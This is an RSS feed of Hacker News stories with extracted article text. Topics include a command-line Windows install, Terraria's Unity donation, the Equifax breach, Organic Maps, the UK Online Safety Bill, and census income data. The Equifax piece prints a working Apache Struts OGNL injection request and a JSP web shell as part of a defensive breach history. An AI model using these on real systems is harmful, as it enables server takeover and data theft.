<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 21 Sep 2023 12:00:10 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Install Windows the Arch Linux Way (233 pts)]]></title>
            <link>https://christitus.com/install-windows-the-arch-linux-way/</link>
            <guid>37593459</guid>
            <pubDate>Thu, 21 Sep 2023 05:15:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://christitus.com/install-windows-the-arch-linux-way/">https://christitus.com/install-windows-the-arch-linux-way/</a>, See on <a href="https://news.ycombinator.com/item?id=37593459">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>Installing Windows strictly through the Command Line is an important tool to have. If windows changes the installer or out of box experience, you can bypass any changes with this guide!</p>
<h2 id="the-installer">The Installer</h2>
<p>Download and Launch the Windows Installer</p>
<p>Launch Command Prompt with <code>Shift+F10</code></p>
<h3 id="partition-both-a-boot-partition-and-data-partition">Partition both a Boot Partition and Data Partition</h3>
<ul>
<li>List Disks with <code>list disk</code></li>
<li>Select desired disk with <code>sel disk #</code></li>
<li>Check to verify there is NO partitions <code>list partition</code></li>
<li>(Optional) Delete any existing partitions <code>del part #</code> <strong>NOTE: THIS ERASES ALL DATA</strong></li>
<li>Check to verify DISK is GPT <code>list disk</code> and use <code>convert gpt</code> if GPT is not enabled <code>*</code></li>
<li>Create Boot partition <code>create partition efi size=100</code></li>
<li>Create Data partition <code>create partition primary size=*</code></li>
<li>Select Boot <code>sel partition 1</code></li>
<li>Format Boot <code>format fs=FAT32 quick</code></li>
<li>Assign Boot partition <code>assign letter=g:</code></li>
<li>Select Data <code>sel par 2</code></li>
<li>Format Data <code>format fs=NTFS quick</code></li>
<li>Assign Data partition <code>assign letter=c:</code> <strong>Note: You may need to UNASSIGN an existing C: drive</strong></li>
</ul>
<h3 id="verify-the-windows-version-to-install">Verify the Windows Version to Install</h3>
<p>DISM is at the heart of every Windows installation. You need to do a verification on your installation ISO to figure out the source index # that you will install.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>DISM /Get-ImageInfo /imagefile:x:\sources\install.wim
</span></span></code></pre></div><p>Note the Index: # that you want to install</p>
<h3 id="install-main-windows-data">Install Main Windows Data</h3>
<p>Now we copy over the operating system in its entirety.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>DISM /apply-image /imagefile:x:\sources\install.wim /index:2 /applydir:c:
</span></span></code></pre></div><h3 id="copy-boot-files-to-efi">Copy Boot Files to EFI</h3>
<p>Copy the boot files to complete the EFI partition to boot into our windows.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>bcdboot c:\Windows /s G: /f ALL
</span></span></code></pre></div><h2 id="bypass-oobe">Bypass OOBE</h2>
<p>The Out of Box Experience is changing all the time. The requirement to be online or only use a Microsoft account. Bypass it with this command and using <code>Shift+F10</code> to bring up the command prompt. <strong>NOTE: DISCONNECT FROM INTERNET before booting!</strong></p>
<p>System will restart after executing the command. Select <code>Continue with limited Setup</code> and name the device and create a local account.</p>
<h2 id="walkthrough-video">Walkthrough Video</h2>

<p>
  <iframe src="https://www.youtube.com/embed/vtxedkuUCas" allowfullscreen="" title="YouTube Video"></iframe>
</p>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Terraria developer bashes Unity, donates $200k to open source alternatives (342 pts)]]></title>
            <link>https://lemm.ee/post/8670706</link>
            <guid>37593133</guid>
            <pubDate>Thu, 21 Sep 2023 04:11:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lemm.ee/post/8670706">https://lemm.ee/post/8670706</a>, See on <a href="https://news.ycombinator.com/item?id=37593133">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Image Text</p>
<p>Re-Logic</p>
<p>The team at Re-Logic has been watching the recent events surrounding Unity with both interest and sadness. The loss of a formerly-leading and user-friendly game engine to the darker forces that negatively impact so much of the gaming industry has left us dismayed to put it mildly. While we do not personally use Unity outside of a few elements on our console/mobile platforms), we feel like we cannot sit idly by as these predatory moves are made against studios everywhere.</p>
<p>We unequivocally condemn and reject the recent TOS/fee changes proposed by Unity and the underhanded way they were rolled out. The flippant manner with which years of trust cultivated by Unity were cast aside for yet another way to squeeze publishers, studios, and gamers is the saddest part. That this move was wholly unnecessary pushes things into the tragedy category - a cautionary tale the industry will not soon forget.</p>
<p>We do not feel that a simple public statement is sufficient. Even if Unity were to recant their policies and statements, the destruction of trust is not so easily repaired. We strongly feel that it is now equally important to get behind some of the other up-and-coming open source game engines. Lighting some candles in an otherwise dark moment. To that end, we are donating $100,000 to each of the open source engines listed below.</p>
<p>Additionally, we are sponsoring each of these projects with $1,000/month each moving forward. All we ask in return is that they remain good people and keep doing all that they can to make these engines powerful and approachable for developers everywhere.</p>
<p>Godot Logo
FNA Logo</p>
<p>Re-Logic has always been supportive of game developers and indie studios that do things the right way. We feel that our actions in this moment are the best way to carry that mission forward - by accelerating and strengthening competing open source game engines, we hope to empower and assist studios that are struggling with how best to proceed given these recent events.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How Equifax Was Breached in 2017 (147 pts)]]></title>
            <link>https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/</link>
            <guid>37592934</guid>
            <pubDate>Thu, 21 Sep 2023 03:35:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/">https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/</a>, See on <a href="https://news.ycombinator.com/item?id=37592934">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>On a Saturday night, a security engineer at Equifax was updating an SSL certificate on a Network Intrusion Detection System (NIDS). Immediately after, suspicious connections were detected. After a more in-depth investigation, it became evident that the situation was far graver than anticipated. A service had to be promptly shut down to prevent further exploitation, but by that point, the damage was already done. Malicious actors had been exfiltrating data for several months and had already collected personal information from 163 million customers.</p><h2 id="how-it-happened"><span>How It Happened</span><a href="#how-it-happened"><i></i></a></h2><h3 id="initial-access"><span>Initial Access</span><a href="#initial-access"><i></i></a></h3><p>The story begins in March 2017 with the disclosure of a vulnerability in the Apache Struts software, tracked as <a href="https://nvd.nist.gov/vuln/detail/cve-2017-5638">CVE-2017-5638</a>. This security flaw allowed threat actors to achieve remote code execution on a server by crafting a specific <code>Content-Type</code> HTTP header. This vulnerability was ranked highly critical for its high impact potential and the ease with which it could be exploited.</p><p>Here an example running the <code>whoami</code> command on a vulnerable server as detailed in this <a href="https://github.com/rapid7/metasploit-framework/blob/1378bfbfc71e5c5a86678b80a29d84190b87185a/modules/exploits/multi/http/struts2_content_type_ognl.rb">exploit</a>.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td><pre><span>GET</span> <span>/struts2-showcase/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>127.0.0.1</span>
<span>Content-Type</span><span>:</span> <span>%{</span>
<span>    (#_='multipart/form-data').</span>
<span>    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span>
<span>    (#_memberAccess?</span>
<span>    (#_memberAccess=#dm):</span>
<span>    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span>
<span>    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span>
<span>    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</span>
<span>    (#context.setMemberAccess(#dm)))).</span>
<span>    (#cmd=@org.apache.struts2.ServletActionContext@getRequest().getHeader('X-kKph')).</span>
<span>    (#os=@java.lang.System@getProperty('os.name')).</span>
<span>    (#cmds=(#os.toLowerCase().contains('win')?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).</span>
<span>    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())</span>
<span>  }</span>
<span>X-kKph</span><span>:</span> <span>whoami</span>
</pre></td></tr></tbody></table></code></p></div><p>Equifax responded by committing to patch all affected applications within 48 hours. They also implemented a detection rule within <a href="https://www.snort.org/">Snort</a>, their Network Intrusion Detection System (NIDS) and conducted a filesystem scan to identify all systems with a vulnerable version of Apache Struts.</p><p>However, one application fell through the cracks, the Automated Consumer Interview System (ACIS). It was a legacy application built in the 1970s that customers used to dispute incorrect credit information. In May 2017, attackers discovered that ACIS was still vulnerable, allowing them to take control of a web server.</p><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/ACIS.png" alt="The Automated Consumer Interview System (ACIS)" data-proofer-ignore="" src="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"></a> <em>The Automated Consumer Interview System (ACIS)</em></p><h3 id="persistence"><span>Persistence</span><a href="#persistence"><i></i></a></h3><p>Shortly after gaining initial access on ACIS, the attackers dropped Web Shells to maintain their foothold on systems. These Web Shells provided a means for the attackers to interact with the system without the need to repeatedly exploit the Apache Struts vulnerability.</p><p>Here’s an example of a basic Web Shell, allowing anyone to execute arbitrary commands by passing them as the “cmd” parameter in HTTP requests.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>&lt;%@ page </span><span>import=</span><span>"java.io.*"</span> <span>%&gt;</span>
<span>&lt;%</span>
    <span>String</span> <span>cmd</span> <span>=</span> <span>request</span><span>.</span><span>getParameter</span><span>(</span><span>"cmd"</span><span>);</span>
    <span>if</span> <span>(</span><span>cmd</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>Process</span> <span>p</span> <span>=</span> <span>Runtime</span><span>.</span><span>getRuntime</span><span>().</span><span>exec</span><span>(</span><span>cmd</span><span>);</span>
        <span>DataInputStream</span> <span>inputstream</span> <span>=</span> <span>new</span> <span>DataInputStream</span><span>(</span><span>p</span><span>.</span><span>getInputStream</span><span>());</span>
        <span>String</span> <span>line</span><span>;</span>
        <span>while</span> <span>((</span><span>line</span> <span>=</span> <span>inputstream</span><span>.</span><span>readLine</span><span>())</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            <span>out</span><span>.</span><span>println</span><span>(</span><span>line</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>%&gt;</span>
</pre></td></tr></tbody></table></code></p></div><h3 id="credential-access"><span>Credential Access</span><a href="#credential-access"><i></i></a></h3><p>ACIS, like any other application, relied on a database, but it didn’t store a significant amount of personal information because it was only used by a small number of clients at Equifax. The attackers continued their search and eventually discovered a mounted NFS share on the web server. This file share contained notes and configuration files used by Equifax engineers, in which they found many database credentials.</p><h3 id="lateral-movement--collection"><span>Lateral Movement &amp; Collection</span><a href="#lateral-movement--collection"><i></i></a></h3><p>There was no segmentation between the legacy system and the rest of Equifax’s infrastructure, making it possible for the attackers to access databases from other Equifax systems. With the credentials found on the file share, they were able to connect and execute queries on 48 different databases. They quickly found a table containing personal identifiable information (PII) and began collecting the data.</p><h3 id="exfiltration"><span>Exfiltration</span><a href="#exfiltration"><i></i></a></h3><p>The customer’s data was divided into multiple compressed files of 10&nbsp;MB each and placed on the web servers in a publicly accessible directory. Gradually, the attackers exfiltrated the data by making HTTP requests with <code>wget</code> from multiple locations to retrieve the contents of these files. This approach was used to minimize the chances of triggering an alert.</p><h2 id="how-it-was-detected"><span>How It Was Detected</span><a href="#how-it-was-detected"><i></i></a></h2><p>During the month of July 2017, 76 days after the start of the attack, Equifax realized that their Network Intrusion Detection System (NIDS) had an expired SSL certificate, preventing them from decrypting and monitoring traffic for the ACIS environment. Immediately after uploading the SSL certificate, the security engineers received multiple alerts regarding suspicious requests coming from IP addresses in China.</p><p>Equifax initiated a thorough investigation, revealing that the filesystem scan, intended to identify systems with a vulnerable version of Apache Struts, had been executed in the incorrect directory within the ACIS environment, leaving those systems unknowingly vulnerable since March 2017. Simultaneously, several web shells were discovered on these servers, and finally they discovered that data being exfiltrated by attackers contained personal identifiable information (PII).</p><p>Following these discoveries, ACIS was promptly shut down as an emergency action to halt the cyberattack.</p><p>During the month of August 2017, Equifax engaged the firm Mandiant to conduct a forensic investigation. By retracing all the steps of the attackers, they discovered that the attackers had successfully exfiltrated data from 163 million customers before being stopped by the shutdown of the ACIS system.</p><h2 id="conclusion"><span>Conclusion</span><a href="#conclusion"><i></i></a></h2><p>The Equifax data breach from 2017 stands out as one of the largest data breaches in history, impacting millions of individuals. It is the result of several mistakes made by Equifax:</p><ul><li>Insufficient knowledge of their legacy systems.</li><li>Poor password storage practices.</li><li>Lack of rigor in the patching process.</li><li>Lack of network segmentation.</li><li>Lack of Host-Based Intrusion Detection System (HIDS)</li><li>Lack of alerting when security tools fail.</li></ul><p>By learning from these errors, organizations can better protect sensitive data and prevent similar incidents in the future.</p><h3 id="sources"><span>Sources</span><a href="#sources"><i></i></a></h3><ul><li><a href="https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf">The Equifax Data Breach | Oversight and Government Reform</a></li><li><a href="https://www.hsgac.senate.gov/wp-content/uploads/imo/media/doc/FINAL%20Equifax%20Report.pdf">How Equifax Neglected Cybersecurity and Suffered a Devastating Data Breach | United States Senate</a></li></ul><h3 id="techniques"><span>Techniques</span><a href="#techniques"><i></i></a></h3><p>The <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> techniques used by the attackers throughout the data breach:</p><ul><li>Initial Access<ul><li><a href="https://attack.mitre.org/techniques/T1190/">T1190 | Exploit Public-Facing Application</a></li></ul></li><li>Persistence<ul><li><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003 | Server Software Component: Web Shell</a></li></ul></li><li>Credential Access<ul><li><a href="https://attack.mitre.org/techniques/T1552/001/">T1552.001 | Unsecured Credentials: Credentials In Files</a></li></ul></li><li>Collection<ul><li><a href="https://attack.mitre.org/techniques/T1039/">T1039 | Data from Network Shared Drive</a></li><li><a href="https://attack.mitre.org/techniques/T1560/">T1560 | Archive Collected Data</a></li></ul></li><li>Exfiltration<ul><li><a href="https://attack.mitre.org/techniques/T1030/">T1030 | Data Transfer Size Limits</a></li></ul></li></ul><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/pixel.png" alt="p" data-proofer-ignore="" src="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"></a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Organic Maps: An open-source maps app that doesn't suck (218 pts)]]></title>
            <link>https://hardfault.life/p/organic-maps-review</link>
            <guid>37592712</guid>
            <pubDate>Thu, 21 Sep 2023 02:54:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hardfault.life/p/organic-maps-review">https://hardfault.life/p/organic-maps-review</a>, See on <a href="https://news.ycombinator.com/item?id=37592712">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>A couple weeks ago while perusing Hacker News, I came across an open-source maps app
called <a href="https://organicmaps.app/">Organic Maps</a>. Proudly billing itself as privacy-focused and
open-source, Organic Maps’ website claims that it is “one of a few applications
nowadays that supports 100% of features without an active internet connection.”</p>
<h2>A World’s Worth Of Doubts</h2>
<p>Map apps are complicated. They must handle tons and tons of road
data. That data has to be accurate - even the most complex interchanges must be
charted correctly. That data needs to be kept up-to-date with information about
closures and other conditions. The routing algorithm has to be effective enough
to get the user to their destination in a safe and timely manner. It also can’t
just sit there saying “recalculating” for minutes on end every time you make a
wrong turn.</p>
<p>Google Maps, Apple Maps, and Waze have elevated the average person’s expectations for a maps app.
15 years ago, a little Garmin GPS mounted to your windshield would give
simple “turn left, turn right” commands using data loaded to an SD card. Today,
a maps app must know if there is traffic ahead, and re-route you accordingly.
It must know which lane(s) you need to use to make a turn. It must know if
there is a state trooper hiding around the corner with a radar gun. It must
know about speed cameras, stalled vehicles, and construction, and all of this
data must be received in real time… right?</p>
<h2>Organic Maps Under Pressure</h2>
<p>I had an emergency last week that requried me to drive more than 300 miles into
the rural Midwest with my fiancee. Having learned of this emergency mere minutes
after reading about Organic Maps, I decided to install the app and put it to
the test on this sudden road trip.</p>
<p>My first stop was downtown Chicago, where I would pick up my fiancee before
leaving the city. I didn’t need the app for this part of the drive, but I
figured it would make a good sanity check. Thankfully, Organic Maps gave me a
sane route that used the interstate and major streets competently.</p>
<p>I was pleased initially, but then I looked at its ETA: 4 minutes! To drive 5
miles! In Chicago! As it turns out, Organic Maps has no traffic data. I already
felt like I had made a mistake by even giving this thing a try. If it doesn’t
know about traffic, then surely
it will be worthless in one of the largest and most congested cities in the
United States!</p>
<p>I opened Google Maps to compare. Google happily presented me with
long stretches of red, indicating the heavy traffic that I knew was there. It
estimated that I would take 14 minutes to arrive downtown (it was right). Yet,
Google chose the same route as Organic Maps. <strong>Google’s traffic data offered me
a much more accurate arrival time, but Google Maps couldn’t actually get me to my
destination faster than Organic Maps.</strong></p>
<p>As it turns out, this wasn’t a fluke. Google Maps and Waze altered our
expectations for a map app’s capabilities, without actually getting
us to our destinations faster. <a href="https://trid.trb.org/view/1495267">This study</a> indicates that modern maps apps
haven’t magically gotten rid of traffic jams, though they have managed to clog up
local streets that didn’t see heavy traffic before. Other sources agree with
this conclusion, including <a href="https://citymonitor.ai/community/neighbourhoods/google-maps-local-traffic">this article from City Monitor</a> that cites some
fascinating UK Department of Transport data. The Atlantic also has
<a href="https://www.theatlantic.com/technology/archive/2018/03/mapping-apps-and-the-price-of-anarchy/555551/">a great writeup</a> on the topic.
Even the most clever of traffic-aware apps can’t get you to your destination a
whole lot faster than a “dumb” app. Traffic is sort of like
energy: you can move it around, but you can’t get rid of it.</p>
<h2>The First Drive</h2>
<p>My impression of Organic Maps immediately improved when I started driving. It
talks! It knows exit numbers! It can tell you which lanes to use! Sure, it isn’t
as polished as Google Maps, but all of the functionality is present. The UI is
high-contrast and easy to read, although I wish the text showing exit
numbers/street names was a little bigger. When you’re simply on the road and
following directions, Organic Maps feels every bit as intuitive as Google Maps.</p>
<p>As my fiancee and I prepared to set off into the boonies, I plugged in the address of our
hotel. About 45 seconds later, Organic Maps returned the 300-mile route to
our destination. It can take a lot longer to calculate longer routes using your
phone’s processor instead of a huge cloud server. It didn’t really bother me
though; 45 seconds is nothing compared to the 6-hour trip ahead. If that’s the
cost of using a maps app that doesn’t spray your personal data all over the
internet, I’ll pay it.</p>
<h2>Heading Into The Boonies</h2>
<p>This drive is familiar to me. As a child, I saw these same roads drift by from
the backseat of a minivan. This was before smartphones and tablets
were in the hands of every child in the country, so I actually paid
attention to the road signs, the condition of each highway, and the
subtle changes in the natural environment. I know those long stretches of the
rural Midwest like a child knows their hometown, through a mental map as vivid
as it is inaccurate.</p>
<p>As we sliced through miles of picturesque nothingness, Organic Maps blended
seamlessly into the background. As interstates gave way to state numbered highways, Organic Maps’
charmingly robotic voice prompted me a couple thousand feet in advance of each
turn. As state numbered highways gave way to county roads, Organic Maps
avoided dirt roads that would look like shortcuts to the uninformed. When the
sun fell below the horizon, Organic Maps switched to a dark mode that prevented
my phone’s screen from blinding me as a drove.</p>
<p>Organic Maps was at its best on this long drive. After I stopped for gas in
a town with no cell service, I had no trouble getting my maps back. Organic
Maps doesn’t need an internet connection to route you to your destination. This
no-network-necessary approach means that you don’t have to fear losing your
route when cell service isn’t available. This feature alone is enough reason to
keep it installed on your phone, just in case you need it.</p>
<h2>Putting a Town On The Map</h2>
<p>Organic Maps performed exceptionally well while driving through rural America,
but once I arrived at my destination, it struggled. This
town isn’t small (technically it qualifies as a city!), and it’s well-known within
its state, yet there were dozens of businesses missing from the map. Many of the
missing businesses weren’t new either - at least a few
have been around for over a decade, yet somehow never made it into
Organic Maps’ database. I could only find my hotel by address; Organic Maps
knew the address, but didn’t know that there was a hotel there.</p>
<p>Organic Maps uses an open map database called <a href="https://www.openstreetmap.org/">OpenStreetMap</a>. Although
OpenStreetMap has very accurate data about streets, addresses, and highways,
its knowledge of what’s actually located at any given address is spotty at best.
Thankfully, Organic Maps has a half-solution to this problem: contribute OpenStreetMap data
yourself! Organic Maps lets you contribute data to OpenStreetMap. Simply press
and hold where the business should be, tap “add a place to the map,” and fill
out the form. I ended up spending an hour of downtime adding information about
various restaurants, libraries, museums, and stores around town. It
would take far longer to add every business in the area, but it’s a good start.
I love being able to contribute to OpenStreetMap, and Organic Maps makes it easy
to do that.</p>
<h2>Fumbling The ITR</h2>
<p>If you need to come into downtown Chicago from the east, there are two ways you
can go. The expensive way is to take I-90 via the Indiana Toll Road (“ITR” for
short) and Chicago Skyway. The cheap way is to take I-94 south to the I-80/I-294
interchange. Both routes eventually put you on <a href="https://en.wikipedia.org/wiki/Dan_Ryan_Expressway">the Dan Ryan</a>, a 14-lane
behemoth heading straight into the heart of the city. Just writing about the
ITR makes my skin crawl, and apparently it also makes Organic Maps upset.</p>
<p>Nearing the end of the drive home, as my impending merge onto the ITR loomed,
Organic Maps did something strange. It told me to take the wrong ramp, which
would have put me on the ITR heading west, then make a U-turn and head
east. I know this drive well enough to know it was asking me to do something
physically impossible. So, I did what I had been trying to avoid the entire
weekend: I disobeyed Organic Maps. I took the correct ramp, Organic Maps quickly
recalculated, and everything went back to normal.</p>
<p>I tried re-creating this problem a couple days later, and Organic Maps did it
again! Here is the incorrect route:</p>
<p><img src="https://hardfault.life/public/organic-maps-review/organic-bad-route.png" alt="Screenshot of the Organic Maps app showing an incorrect route"></p>
<p>Notice the little kink in the route near the top-right corner of the image -
that’s a U-turn that doesn’t actually exist. Even more bizarre is that
the <a href="https://www.openstreetmap.org/">OpenStreetMap</a> website gets the correct route:</p>
<p><img src="https://hardfault.life/public/organic-maps-review/osm-correct-route.png" alt="Screenshot of the OpenStreetMap web app showing the correct route"></p>
<p>This shook my confidence in Organic Maps, but after more than 1000 miles of
otherwise worry-free routing, this seemed to be a one-off bug. I created an
<a href="https://github.com/organicmaps/organicmaps/issues/5983">issue on GitHub</a> and the developers responded swiftly. Unfortunately, it can
take a few weeks for an OpenStreetMap update to get pushed out, so now I
(and anyone else driving westbound into Chicago) must wait for the new, more
accurate map data.</p>
<h2>Returning Home</h2>
<p>Organic Maps has proven itself to be a competent alternative to Google Maps,
at least for my purposes. Its UI is simple and intuitive. Organic Maps gets me
to my destinations as quickly and safely as Google Maps, even though it doesn’t
have Google’s extensive traffic data. Organic Maps isn’t operated by megacorp
trying to make you buy things.</p>
<p>Organic Maps is certainly not for everyone. If you are constantly
running out of storage space on your phone, Organic Maps’ need to download
hundreds of megabytes of map data onto your phone will be a non-starter. On the
other hand, its offline map storage means that it doesn’t need an internet
connection to get you to your destination.</p>
<p>Incorrect or missing businesses are the biggest inconvenience of using Organic Maps.
I occasionally switch back to Google Maps when a business or address is missing.
In this regard, Organic Maps can only improve if people use it. If your destination
is missing, add it. If some information is out of date, update it. I would
strongly encourage anyone to try Organic Maps for a week or two. I gave it an
honest chance, and it made a lasting impression.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK Parliament undermined the privacy, security, freedom of all internet users (431 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users</link>
            <guid>37592699</guid>
            <pubDate>Thu, 21 Sep 2023 02:51:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users">https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users</a>, See on <a href="https://news.ycombinator.com/item?id=37592699">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p><span>The U.K. Parliament </span><a href="https://www.reuters.com/world/uk/uks-online-safety-bill-passed-by-parliament-2023-09-19/"><span>has passed the Online Safety Bill</span></a><span> (OSB), which says it will make the U.K. “the safest place” in the world to be online. In reality, the OSB will lead to a much more censored, locked-down internet for British users. The bill could empower the government to undermine not just the privacy and security of U.K. residents, but <a href="https://www.eff.org/deeplinks/2021/08/if-you-build-it-they-will-come-apple-has-opened-backdoor-increased-surveillance">internet users worldwide</a>.&nbsp;</span></p>
<h3><b>A Backdoor That Undermines Encryption</b></h3>
<p><span>A clause of the bill allows Ofcom, the British telecom regulator, to serve a notice requiring tech companies to scan their users–all of them–for child abuse content.This would&nbsp;affect&nbsp;even messages and files that are end-to-end encrypted to protect user privacy. As enacted, the OSB allows the government to force companies to build technology that can scan regardless of encryption–in other words, build a backdoor.&nbsp;</span></p>
<p><span>These types of </span><a href="https://www.eff.org/deeplinks/2019/11/why-adding-client-side-scanning-breaks-end-end-encryption"><span>client-side scanning systems</span></a><span> amount to </span><a href="https://arxiv.org/abs/2110.07450"><span>“Bugs in Our Pockets,”</span></a><span> and a group of leading computer security experts has reached the same conclusion as EFF–they undermine privacy and security for everyone. That’s why EFF has </span><a href="https://www.eff.org/deeplinks/2023/07/uk-government-very-close-eroding-encryption-worldwide"><span>strongly opposed the OSB</span></a><span> for </span><a href="https://www.eff.org/deeplinks/2022/08/uks-online-safety-bill-attacks-free-speech-and-encryption"><span>years</span></a><span>.&nbsp;</span></p>
<p><span>It’s a basic human right to have a private conversation. This right is even more important for the most vulnerable people. If the U.K. uses its new powers to scan people’s data, lawmakers will damage&nbsp;the security people need to protect themselves from harassers, data thieves, authoritarian governments, and others. Paradoxically, U.K. lawmakers have created these new risks in the name of online safety.&nbsp;</span></p>
<p><span>The U.K. government has </span><a href="https://www.eff.org/deeplinks/2023/09/uk-government-knows-how-extreme-online-safety-bill"><span>made some recent statements</span></a><span> </span><span>indicating that it actually realizes that getting around end-to-end encryption isn’t compatible with protecting user privacy. But given the text of the law, neither the government’s private statements to tech companies, nor its weak public assurances, are enough to protect the human rights of British people or internet users around the world.&nbsp;</span></p>
<h3><b>Censorship and Age-Gating</b></h3>
<p><span>Online platforms will be expected to remove content that the U.K. government views as inappropriate for children. If they don’t, they’ll face heavy penalties. The problem is, in the U.K. as in the U.S., </span><a href="https://www.eff.org/deeplinks/2023/08/us-government-about-control-speech-online-protect-kids"><span>people do not agree about what type of content is harmful for kids</span></a><span>. Putting that decision in the hands of government regulators will lead to politicized censorship decisions.&nbsp;</span></p>
<p><span>The OSB will also lead to </span><a href="https://www.eff.org/deeplinks/2023/03/age-verification-mandates-would-undermine-anonymity-online"><span>harmful age-verification systems</span></a><span>. This violates fundamental principles about anonymous and simple access that has existed since the beginning of the Internet. You shouldn’t have to show your ID to get online. Age-gating systems meant to keep out kids invariably lead to adults losing their rights to private speech, and anonymous speech, which is sometimes necessary.&nbsp;</span></p>
<p><span>In the coming months, we’ll be watching what type of regulations the U.K. government publishes describing how it will use these new powers to regulate the internet. If the regulators claim their right to require the creation of dangerous backdoors in encrypted services, we expect encrypted messaging services to </span><a href="https://techcrunch.com/2023/06/27/an-encryption-exodus-looms-over-uks-online-safety-bill/"><span>keep their promises</span></a><span> and withdraw from the U.K. if that nation’s government&nbsp;compromises their ability to protect other users.&nbsp;</span></p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Terry Tao's generals (247 pts)]]></title>
            <link>https://web.math.princeton.edu/generals/tao_terence</link>
            <guid>37591652</guid>
            <pubDate>Thu, 21 Sep 2023 00:00:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://web.math.princeton.edu/generals/tao_terence">https://web.math.princeton.edu/generals/tao_terence</a>, See on <a href="https://news.ycombinator.com/item?id=37591652">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Median Household Income After Taxes Fell 8.8% in 2022 (162 pts)]]></title>
            <link>https://www.census.gov/library/stories/2023/09/median-household-income.html</link>
            <guid>37591478</guid>
            <pubDate>Wed, 20 Sep 2023 23:35:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.census.gov/library/stories/2023/09/median-household-income.html">https://www.census.gov/library/stories/2023/09/median-household-income.html</a>, See on <a href="https://news.ycombinator.com/item?id=37591478">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="textcore-ce5d68a1d8">
    <p>Real median household income after taxes fell 8.8% to $64,240 from 2021 to 2022 and the poverty rate after taxes as measured by the Supplemental Poverty Measure (SPM) increased 59% to 12.4%.</p>
<p>These significant changes in <i>after-tax</i> income and poverty rates of U.S. households were much larger than the annual changes in <i>before-tax</i> income and poverty, according to U.S. Census Bureau data released today.</p>

</div><div>
<p>The expiration of expansions to refundable tax credits had a particularly important impact on SPM poverty.</p>

    

</div><div id="textcore-824ce80faa">
    <p>The Census Bureau reports, <i>Income in the United States: 2022 </i>and <i>Poverty in the United States: 2022</i>, show that <i>before</i> taxes, median household income declined 2.3% to $74,580 and the poverty rate (11.5%), as measured by the official poverty measure, was not statistically different from 2021.</p>
<p>This dramatic difference can be attributed to key changes in federal tax policy.</p>
